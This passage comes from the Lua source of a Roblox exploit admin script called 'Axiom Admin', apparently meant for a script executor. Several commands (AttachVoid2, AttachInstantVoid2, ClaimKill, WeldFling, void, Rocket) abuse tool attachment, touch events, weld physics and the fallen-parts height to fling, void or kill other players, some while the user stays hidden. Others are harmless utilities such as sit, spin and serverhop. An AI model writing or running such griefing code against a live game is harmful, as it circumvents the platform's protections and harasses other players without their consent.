			Name = "AttachVoid2",
			Aliases = {"attachvoid2", "avoid2", "abanish2"},
			Description = "Voids a player with a falling object.",
			Usage = "attachvoid2 <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Handle.CanCollide = false
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					tempdisableantifling = true
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(0,math.Huge,0)
						for i = 1,10 do
							getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.new(0,10000000000000000000,0)
							task.wait()
						end
						task.wait(1)
						destroyGrip()
						getChar():FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():FindFirstChild("HumanoidRootPart").CFrame = oldcf
						task.wait()
						getChar():Destroy()
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
						tempdisableantifling = false
					end
				end
			end
		},
		{
			Name = "AttachInstantVoid2",
			Aliases = {"attachinstantvoid2", "ainstavoid2", "aivoid2"},
			Description = "Voids a player with a falling object killing them instantly.",
			Usage = "attachinstantvoid2 <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local origFpdh = workspace.FallenPartsDestroyHeight
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
						workspace.FallenPartsDestroyHeight = 0/0
					tool.Parent = getBp()
					tool.Handle.CanCollide = false
					tool.Handle.Massless = true
					tool.GripPos = Vector3.new(0, 10000, 0)
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
					if tool ~= nil then
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.GettingUp, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Landed, true)
						setHumState(getChar():FindFirstChildOfClass("Humanoid"), Enum.HumanoidStateType.Running, true)
						getChar():Destroy()
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					end
				end
			end
		},
		{
			Name = "Attach",
			Aliases = {"attach", "grab", "hold"},
			Description = "Attach's a player to you with a falling object.",
			Usage = "attach <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
					tool.Parent = getBp()
					tool.Handle.CanCollide = false
					tool.Handle.Massless = true
					DestroyHumToAttach()
					tool.Parent = getChar()
					task.wait()
					repeat 
						globalLib.firetouchinterest(v.Character.HumanoidRootPart,tool.Handle,0)
					until tool.Parent == v.Character or tool == nil
						plr.CharacterAdded:Wait(); 
						getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
						getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					
				end
			end
		},
		{
			Name = "CharacterOwnershipTransfer",
			Aliases = {"characterownershiptransfer", "claim"},
			Description = "Claims's a player with a falling object.",
			Usage = "characterownershiptransfer <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local getCharOnClaim = claim(v)
					plr.CharacterAdded:Wait(); 
					getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					
				end
			end
		},
		{
			Name = "ClaimKill",
			Aliases = {"claimkill", "ckill"},
			Description = "Claims's a player with a falling object and kills them.",
			Usage = "claimkill <player>",
			Arguments = {"player"},
			Run = function(args)
				notice("Axiom warning: this command may not run due to Workspace.RejectCharacterDeletions you may have to use FixCharacter")
				local target = getPlr(args[1])
				for i,v in pairs(target)do
					if #target == 0 then return end
					if v.Character:FindFirstChild("Humanoid") or v.Character:FindFirstChild("HumanoidRootPart") then
						if v.Character:FindFirstChild("Humanoid").Health <=0 then 
							notice("Axiom prevent a action from running due to: Target is dead")
							return
						end
						if not v.Character:FindFirstChild("HumanoidRootPart") then 
							notice("Axiom prevent a action from running due to: Target is dead or destroyed")
							return
						end
					end
					local oldcf = getChar():FindFirstChild("HumanoidRootPart").CFrame
					local getCharOnClaim = claim(v)
					task.wait()
					v.Character:FindFirstChild("Humanoid").Health = 0
					plr.CharacterAdded:Wait(); 
					getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").CFrame = oldcf
					
				end
			end
		},
		{
			Name = "Sit",
			Aliases = {"sit"},
			Description = "Makes your player sit down.",
			Usage = "sit",
			Arguments = {},
			Run = function(args)
				getChar().Humanoid.Sit = true
			end
		},
		{
			Name = "Print",
			Aliases = {"print"},
			Description = "Client prints message.",
			Usage = "print <string>",
			Arguments = {"string"},
			Run = function(args)
				local message = table.concat(args, " ", 1)
    			print(message)
			end
		},
		{
			Name = "Chat",
			Aliases = {"chat"},
			Description = "Client sends a chat request.",
			Usage = "chat <string>",
			Arguments = {"string"},
			Run = function(args)
				local message = table.concat(args, " ", 1)
				local TextChatService = game:GetService("TextChatService")
				TextChatService.TextChannels.RBXGeneral:SendAsync(message)
			end
		},
		{
			Name = "PrivateChat",
			Aliases = {"privatechat", "whisper"},
			Description = "Client sends a private chat request.",
			Usage = "privatechat <player> <string>",
			Arguments = {"player", "string"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end
				local target = targets[1]
				local message = table.concat(args, " ", 2)
				privatechat(target, message)
			end
		},
		{
			Name = "TellScript",
			Aliases = {"tellscript"},
			Description = "Tells someone the script your using.",
			Usage = "tellscript <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end
				local target = targets[1]
				privatechat(target, "AXIOM | Axiom Admin v1.0")
			end
		},
		{
			Name = "BringObjects",
			Aliases = {"bringobjects", "bringunanchored"},
			Description = "Brings all objects in the workspace to you.",
			Usage = "bringobjects",
			Arguments = {},
			Run = function(args)
				for _, v in pairs(workspace:GetChildren()) do
					if v:IsA("BasePart") and not v.Anchored then
						v.CFrame = getChar().HumanoidRootPart.CFrame
					end
					if v:IsA("Model") and v:FindFirstChildOfClass("BasePart") and not v:FindFirstChildOfClass("BasePart").Anchored then
						v:SetPrimaryPartCFrame(getChar().HumanoidRootPart.CFrame)
					end
				end
			end
		},
		{
			Name = "HumanoidState",
			Aliases = {"humanoidstate", "hstate"},
			Description = "Changes your humanoid state.",
			Usage = "humanoidstate <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1])
				if val == nil then return end
				getChar().Humanoid:ChangeState(val)
			end
		},
		{
			Name = "Stare",
			Aliases = {"stare"},
			Description = "Makes your character continuously face a target player.",
			Usage = "stare [player]",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end

				local target = targets[1]

				local character = getChar()
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then return end

				local RunService = game:GetService("RunService")

				if StareState.Connection then
					StareState.Connection:Disconnect()
					StareState.Connection = nil
				end

				StareState.Target = target

				StareState.Connection = RunService.Heartbeat:Connect(function()
					if not hrp.Parent then
						if StareState.Connection then StareState.Connection:Disconnect() end
						StareState.Connection = nil
						StareState.Target = nil
						return
					end

					local targetChar = target.Character
					if not targetChar then return end

					local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
					if not targetHRP then return end

					local myPos = hrp.Position
					local targetPos = targetHRP.Position

					local lookPos = Vector3.new(targetPos.X, myPos.Y, targetPos.Z)

					if (lookPos - myPos).Magnitude > 0.01 then
						hrp.CFrame = CFrame.new(myPos, lookPos)
					end
				end)
			end
		},
		{
			Name = "Unstare",
			Aliases = {"unstare"},
			Description = "Stops staring at the target.",
			Usage = "unstare",
			Arguments = {},
			Run = function(args)
				if StareState.Connection then
					StareState.Connection:Disconnect()
					StareState.Connection = nil
				end
				StareState.Target = nil
			end
		},
		{
			Name = "MControlR6",
			Aliases = {"mcontrolr6", "carpetr6"},
			Description = "Controls R6 players with character collisions.",
			Usage = "mcontrolr6 <player>",
			Arguments = {"player"},
			Run = function(args)
				if mcontroltest then return end

				local targets = getPlr(args[1])
				if #targets == 0 then return end

				local v = targets[1]
				local character = getChar() 
				local rootPart = character:WaitForChild("HumanoidRootPart")
				local oldcharcf = rootPart.CFrame
				local hum = character:WaitForChild("Humanoid")

				mcontroltest = true
				hum.PlatformStand = true
				nc = true

				local input = {
					W = false,
					A = false,
					S = false,
					D = false,
				}

				local UIS = game:GetService("UserInputService")

				local function onBegan(inp, gp)
					if gp then return end
					if inp.KeyCode == Enum.KeyCode.W then input.W = true end
					if inp.KeyCode == Enum.KeyCode.A then input.A = true end
					if inp.KeyCode == Enum.KeyCode.S then input.S = true end
					if inp.KeyCode == Enum.KeyCode.D then input.D = true end
				end

				local function onEnded(inp, gp)
					if inp.KeyCode == Enum.KeyCode.W then input.W = false end
					if inp.KeyCode == Enum.KeyCode.A then input.A = false end
					if inp.KeyCode == Enum.KeyCode.S then input.S = false end
					if inp.KeyCode == Enum.KeyCode.D then input.D = false end
				end

				local conn1 = UIS.InputBegan:Connect(onBegan)
				local conn2 = UIS.InputEnded:Connect(onEnded)

				local speed = 2

				local function cleanup()
					conn1:Disconnect()
					conn2:Disconnect()
					rootPart.AssemblyLinearVelocity = Vector3.zero
					rootPart.AssemblyAngularVelocity = Vector3.zero
					hum.PlatformStand = false
					nc = false
					mcontroltest = false
					glue(v, false)
					workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
				end
				workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
				task.spawn(function()
					while mcontroltest
						and chechifalive(v.Character)
						and chechifalive(character)
					do
						if input.W or input.S or input.D or input.A then
							rootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3.495, 0) * CFrame.Angles(math.rad(-90), 0, 0)
						else
							rootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, -7, 0) * CFrame.Angles(math.rad(-90), 0, 0)
						end

						

						local cf = rootPart.CFrame

						local move = Vector3.zero

						if input.W then 
							move += cf.UpVector 
						end
						if input.S then
							 move -= cf.UpVector
							 end
						if input.D then 
							move += cf.RightVector 
						end
						if input.A then 
							move -= cf.RightVector
						end

						if move.Magnitude > 1 then
							move = move.Unit
						end
						local current = rootPart.AssemblyLinearVelocity
						local target = move * speed

						local vel = current:Lerp(target, 0.15)
						vel = Vector3.new(vel.X, 0, vel.Z)
						rootPart.AssemblyLinearVelocity = vel
						rootPart.AssemblyAngularVelocity = Vector3.zero
						rootPart.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0, 0, 1, 1)
						rootPart.Massless = false
						glue(v, true)
						task.wait()
						glue(v, false)
					end

					cleanup()
					getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
					getChar():WaitForChild("HumanoidRootPart").CFrame = oldcharcf
				end)
			end
		},

		{
			Name = "UnMControlR6",
			Aliases = {"unmcontrolr6", "uncarpetr6"},
			Description = "Stops the MControlR6.",
			Usage = "unmcontrolr6",
			Arguments = {},
			Run = function(args)
				if not mcontroltest then return end
				mcontroltest = false
			end
		},
		{
			Name = "Gravity",
			Aliases = {"gravity", "grav"},
			Description = "Changes your gravity.",
			Usage = "gravity <value>",
			Arguments = {"value"},
			Run = function(args)
				local val = tonumber(args[1])
				if val == nil then return end
				workspace.Gravity = val
			end
		},
		{
			Name = "Sword",
			Aliases = {"sword"},
			Description = "Gives you a CLIENT SIDED sword.",
			Usage = "sword",
			Arguments = {},
			Run = function(args)
				if not getBp():FindFirstChild("Sword") then
					local Sword = Instance.new("Tool")
					local Handle = Instance.new("Part")
					local Mesh = Instance.new("SpecialMesh")
					local Unsheath = Instance.new("Sound")
					local SwordSlash = Instance.new("Sound")
					SwordSlash.Name = "SwordSlash"
					Unsheath.Name = "Unsheath"
					Unsheath.SoundId = "http://www.roblox.com/asset/?id=12222225"
					Unsheath.Volume = 1
					SwordSlash.SoundId = "http://www.roblox.com/asset/?id=12222216"
					SwordSlash.Volume = .7
					Unsheath.Parent = Handle
					SwordSlash.Parent = Handle
					Mesh.Parent = Handle
					Mesh.MeshId = "rbxassetid://497078148"
					Mesh.Scale = Vector3.new(5,5,5)
					Handle.Name = "Handle"
					Handle.Parent = Sword
					Sword.Name = "Sword"
					Sword.GripForward = Vector3.new(-1,0,0)
					Sword.GripPos = Vector3.new(0,0,-1.5)
					Sword.GripRight = Vector3.new(0,1,0)
					Sword.GripUp = Vector3.new(0,0,1)
					Sword.ToolTip = "Sword"
					Sword.TextureId = "rbxasset://Textures/Sword128.png"
					Sword.CanBeDropped = false
					Sword.RequiresHandle = true
					Handle.Orientation = Vector3.new(-46.24, 42.14, 50.93)
					Handle.Position = Vector3.new(-3.174,1.57,3.04)
					Handle.CanCollide = true
					Handle.Size = Vector3.new(1,.8,4)
					Mesh.MeshId = "rbxasset://fonts/sword.mesh"
					Mesh.MeshType = "FileMesh"
					Mesh.Offset = Vector3.new(0,0,0)
					Mesh.Scale = Vector3.new(1,1,1)
					Mesh.TextureId = "rbxasset://textures/SwordTexture.png"
					Sword.Equipped:Connect(function()
						Unsheath:Play()
					end)
					Sword.Activated:Connect(function()
						SwordSlash:Play()
						local Anim = Instance.new("StringValue")
						Anim.Name = "toolanim"
						Anim.Value = "Slash"
						Anim.Parent = Sword
					end)
					Mouse_Icon = "rbxasset://textures/GunCursor.png"
					Reloading_Icon = "rbxasset://textures/GunWaitCursor.png"
					Tool = Sword
					Mouse = nil
					function UpdateIcon()
						if Mouse then
							Mouse.Icon = Tool.Enabled and Mouse_Icon or Reloading_Icon
						end
					end
					function OnEquipped(ToolMouse)
						Mouse = ToolMouse
						UpdateIcon()
					end
					function OnChanged(Property)
						if Property == "Enabled" then
							UpdateIcon()
						end
					end
					Tool.Equipped:Connect(OnEquipped)
					Tool.Changed:Connect(OnChanged)
					Sword.Parent = game.Players.LocalPlayer.Backpack
				end
			end
		},
		{
			Name = "PunchTool",
			Aliases = {"punchtool"},
			Description = "Gives you the ability to punch people.",
			Usage = "punchtool",
			Arguments = {},
			Run = function(args)
				if not getBp():FindFirstChild("PunchTool") then
					local BaseBallBat = Instance.new("Tool", getBp())
					BaseBallBat.Name = "PunchTool"
					local Animation =Instance.new("Animation", BaseBallBat)
					Animation.AnimationId = "rbxassetid://218504594"
					local Track = getChar().Humanoid:LoadAnimation(Animation)
					local Cooldown = false
					local Attacked = false
					local Attacking = false
					BaseBallBat.Equipped:Connect(function()
						BaseBallBat.Activated:Connect(function()
							if not Cooldown then
								Cooldown = true
								Attacking = true
								Track:Play()
								wait(0.25)
								Cooldown = false
								Attacked = false
								Attacking = false
							end
						end)
					end)
				end
			end
		},
		{
			Name = "time",
			Aliases = {"time"},
			Description = "Changes the time of day.",
			Usage = "time <value>",
			Arguments = {"value"},
			Run = function(args)
				local timeValue = tonumber(args[1])
				if timeValue then
					game.Lighting.TimeOfDay = timeValue
				end
			end
		},
		{
			Name = "WeldFling",
			Aliases = {"weldfling", "fling", "throw"},
			Description = "Fling players using weld abuse.",
			Usage = "weldfling <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				WeldFling(targets, CFrame.new(0, -3, 0), CFrame.Angles(math.rad(45),0, 0), Vector3.new(math.random(100, 500), math.random(500, 1000), math.random(100, 500)), true)
				if #targets == 0 then return end
				notice("This will take abit depending on your executor, dw they cant see you.")
				local target = targets[1]
				local targetChar = target.Character
				local root = getChar().HumanoidRootPart
				if not targetChar then return end
				glue(target, true)
			end
		},
		{
			Name = "HeadSit",
			Aliases = {"headsit"},
			Description = "Makes you sit on a players head.",
			Usage = "headsit <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end
				local target = targets[1]
				local targetChar = target.Character
				if not targetChar then return end

				local targetHead = targetChar:FindFirstChild("Head")
				if not targetHead then return end

				local character = getChar()
				local old = character:WaitForChild("HumanoidRootPart").CFrame
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not humanoid or not torso or not hrp then return end

				if HeadSitState.Part then
					if HeadSitState.Connection then HeadSitState.Connection:Disconnect() end
					if HeadSitState.JumpConnection then HeadSitState.JumpConnection:Disconnect() end
					if HeadSitState.AnchorWeld then HeadSitState.AnchorWeld:Destroy() end
					if HeadSitState.Part then HeadSitState.Part:Destroy() end

					HeadSitState.Part = nil
					HeadSitState.AnchorWeld = nil
					HeadSitState.Connection = nil
					HeadSitState.JumpConnection = nil

					humanoid.Sit = false
					return
				end
				if HeadSitState2.Active then
					if HeadSitState2.Connection then HeadSitState2.Connection:Disconnect() end
					if HeadSitState2.JumpConnection then HeadSitState2.JumpConnection:Disconnect() end

					HeadSitState2.Active = false
					HeadSitState2.Connection = nil
					HeadSitState2.JumpConnection = nil

					humanoid.Sit = false
					task.wait()
					nc = false
					local root = getChar():WaitForChild("HumanoidRootPart")
					root.AssemblyLinearVelocity = Vector3.zero
					root.AssemblyAngularVelocity = Vector3.zero
					root.CFrame = old
					return
				end

				local RunService = game:GetService("RunService")

				nc = true
				humanoid.Sit = true
				HeadSitState2.Active = true

				local torsoOffsetFromHRP = hrp.CFrame:ToObjectSpace(torso.CFrame)

				local function cleanup(returnToOld)
					if HeadSitState2.Connection then HeadSitState2.Connection:Disconnect() end
					if HeadSitState2.JumpConnection then HeadSitState2.JumpConnection:Disconnect() end

					HeadSitState2.Active = false
					HeadSitState2.Connection = nil
					HeadSitState2.JumpConnection = nil

					humanoid.Sit = false
					task.wait()
					nc = false

					if returnToOld then
						local root = getChar():WaitForChild("HumanoidRootPart")
						root.AssemblyLinearVelocity = Vector3.zero
						root.AssemblyAngularVelocity = Vector3.zero
						root.CFrame = old
					end
				end

				HeadSitState2.Connection = RunService.Heartbeat:Connect(function()
					if not humanoid.Sit then
						cleanup(true)
						return
					end

					if not targetHead.Parent then
						cleanup(true)
						return
					end

					glue(target, true)
					local desiredTorsoCFrame = targetHead.CFrame * CFrame.new(0, 2, 0)
					hrp.CFrame = desiredTorsoCFrame * torsoOffsetFromHRP:Inverse()
					hrp.AssemblyLinearVelocity = Vector3.zero
					hrp.AssemblyAngularVelocity = Vector3.zero
					task.wait(0.2)
				end)

				HeadSitState2.JumpConnection = humanoid.StateChanged:Connect(function(_, newState)
					if newState == Enum.HumanoidStateType.Jumping then
						cleanup(true)
					end
				end)
			end
		},
		{
			Name = "Rocket",
			Aliases = {"rocket"},
			Description = "Fling a player upwards.",
			Usage = "rocket <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				WeldFling(targets, CFrame.new(0, -3, 0), CFrame.Angles(math.rad(45),0, 0), Vector3.new(0,200,0), false)
			end
		},
		{
			Name = "void",
			Aliases = {"void", "banish"},
			Description = "Fling a player to the void.",
			Usage = "void <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				WeldFling(targets, CFrame.new(0, -3, 0), CFrame.Angles(math.rad(45), 0, 0), Vector3.new(0,10000000000000000000,0), true)
				if #targets == 0 then return end
				notice("This will take abit depending on your executor, they cant see you.")
				local target = targets[1]
				local targetChar = target.Character
				local root = getChar().HumanoidRootPart
				if not targetChar then return end
				glue(target, true)
			end
		},
		{
			Name = "ServerHop",
			Aliases = {"serverhop", "hop"},
			Description = "Teleports you to a different server.",
			Usage = "serverhop",
			Arguments = {},
			Run = function(args)
				local TeleportService = game:GetService("TeleportService")
				local HttpService = game:GetService("HttpService")
				local Players = game:GetService("Players")

				local placeId = game.PlaceId
				local currentJobId = game.JobId

				local cursor = ""
				local servers = {}

				for i = 1, 5 do 
					local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(placeId)
					if cursor ~= "" then
						url = url .. "&cursor=" .. cursor
					end

					local success, result = pcall(function()
						return game:HttpGet(url)
					end)

					if not success then break end

					local data = HttpService:JSONDecode(result)

					for _, server in ipairs(data.data) do
						if server.id ~= currentJobId and server.playing < server.maxPlayers then
							table.insert(servers, server)
						end
					end

					if data.nextPageCursor then
						cursor = data.nextPageCursor
					else
						break
					end

					if #servers > 0 then break end 
				end

				if #servers == 0 then
					warn("No available servers found.")
					return
				end

				local chosen = servers[math.random(1, #servers)]

				local success, err = pcall(function()
					TeleportService:TeleportToPlaceInstance(placeId, chosen.id, Players.LocalPlayer)
				end)

				if not success then
					warn("Teleport failed: " .. tostring(err))
				end
			end
		},
		{
			Name = "Lay",
			Aliases = {"lay", "laydown"},
			Description = "Makes your character go limp and lay down.",
			Usage = "lay",
			Arguments = {},
			Run = function(args)
				local character = getChar()
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid then return end

				humanoid.PlatformStand = true
			end
		},

		{
			Name = "Unlay",
			Aliases = {"unlay", "standup"},
			Description = "Stands your character back up.",
			Usage = "unlay",
			Arguments = {},
			Run = function(args)
				local character = getChar()
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid then return end

				humanoid.PlatformStand = false
			end
		},
		{
			Name = "PlayAllSounds",
			Aliases = {"playallsounds"},
			Description = "Plays all sounds in the workspace.",
			Usage = "playallsounds",
			Arguments = {},
			Run = function(args)
				if SoundLoop.Running then return end 
				SoundLoop.Sounds = {}
				for _, obj in ipairs(workspace:GetDescendants()) do
					if obj:IsA("Sound") then
						table.insert(SoundLoop.Sounds, obj)
					end
				end

				if #SoundLoop.Sounds == 0 then
					warn("No sounds found in workspace.")
					return
				end

				SoundLoop.Running = true

				repeat 
					game:GetService("RunService").PreRender:Wait()
					for _, sound in ipairs(SoundLoop.Sounds) do
						sound:Play()
						sound.Playing = true
						task.wait(0.1)
					end
				until not SoundLoop.Running
				
			end
		},
		{
			Name = "SpamToolSounds",
			Aliases = {"spamtoolsounds"},
			Description = "Plays all sounds from tools in your hands.",
			Usage = "spamtoolsounds",
			Arguments = {},
			Run = function(args)
				if SoundLoop.Running then return end 
				SoundLoop.Sounds = {}
				for _, tool in ipairs(getChar():GetDescendants()) do
					if tool:IsA("Tool") then
						for _, obj in ipairs(tool:GetDescendants()) do
							if obj:IsA("Sound") then
								table.insert(SoundLoop.Sounds, obj)
							end
						end
					end
				end

				if #SoundLoop.Sounds == 0 then
					warn("No sounds found in inventory.")
					return
				end

				SoundLoop.Running = true

				repeat 
					game:GetService("RunService").PreRender:Wait()
					for _, sound in ipairs(SoundLoop.Sounds) do
						sound:Play()
						sound.Playing = true
						task.wait(0.1)
					end
				until not SoundLoop.Running

			end
		},
		{
			Name = "UnPlayAllSounds",
			Aliases = {"unplayallsounds"},
			Description = "Stops playing all loop sounds.",
			Usage = "unplayallsounds",
			Arguments = {},
			Run = function(args)
				if not SoundLoop.Running then return end
				SoundLoop.Running = false

				for _, conn in ipairs(SoundLoop.Connections) do
					conn:Disconnect()
				end
				SoundLoop.Connections = {}

				for _, sound in ipairs(SoundLoop.Sounds) do
					if sound and sound.Parent then
						sound:Stop()
						sound.Playing = false
					end
				end
			end
		},
		{
			Name = "Spin",
			Aliases = {"spin"},
			Description = "Spins your character at a given speed.",
			Usage = "spin [value]",
			Arguments = {"value"},
			Run = function(args)
				local speed = tonumber(args[1])
				if not speed then return end

				local character = getChar()
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then return end

				if SpinLoop.Connection then
					SpinLoop.Connection:Disconnect()
					SpinLoop.Connection = nil
				end

				local RunService = game:GetService("RunService")

				SpinLoop.Connection = RunService.Heartbeat:Connect(function(dt)
					if not hrp or not hrp.Parent then
						SpinLoop.Connection:Disconnect()
						SpinLoop.Connection = nil
						return
					end

					hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(speed) * dt * 60, 0)
				end)
			end
		},

		{
			Name = "Unspin",
			Aliases = {"unspin"},
			Description = "Stops spinning.",
			Usage = "unspin",
			Arguments = {},
			Run = function(args)
				if SpinLoop.Connection then
					SpinLoop.Connection:Disconnect()
					SpinLoop.Connection = nil
				end
			end
		},
		{
			Name = "Follow",
			Aliases = {"follow"},
			Description = "Pathfinds your character to follow a player.",
			Usage = "follow [player]",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				if #target == 0 then return end
				local targetPlayer = target[1]

				local character = getChar()
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not humanoid or not hrp then return end

				local PathfindingService = game:GetService("PathfindingService")
				local RunService = game:GetService("RunService")

				if FollowLoop.Connection then
					FollowLoop.Connection:Disconnect()
					FollowLoop.Connection = nil
				end
				FollowLoop.Active = true

				local currentWaypoints = nil
				local waypointIndex = 1
				local lastTargetPos = nil
				local recomputeTimer = 0

				FollowLoop.Connection = RunService.Heartbeat:Connect(function(dt)
					if not FollowLoop.Active then
						FollowLoop.Connection:Disconnect()
						FollowLoop.Connection = nil
						return
					end

					if not character.Parent or not hrp.Parent then
						FollowLoop.Active = false
						FollowLoop.Connection:Disconnect()
						FollowLoop.Connection = nil
						return
					end

					local targetChar = targetPlayer.Character
					if not targetChar or not targetChar:FindFirstChild("HumanoidRootPart") then
						return 
					end

					local targetHRP = targetChar.HumanoidRootPart
					local targetPos = targetHRP.Position

					recomputeTimer += dt

					local needsRecompute = false
					if not currentWaypoints then
						needsRecompute = true
					elseif recomputeTimer >= 1.5 then
						needsRecompute = true
					elseif lastTargetPos and (targetPos - lastTargetPos).Magnitude > 5 then
						needsRecompute = true
					end

					if needsRecompute then
						recomputeTimer = 0
						lastTargetPos = targetPos

						local path = PathfindingService:CreatePath({
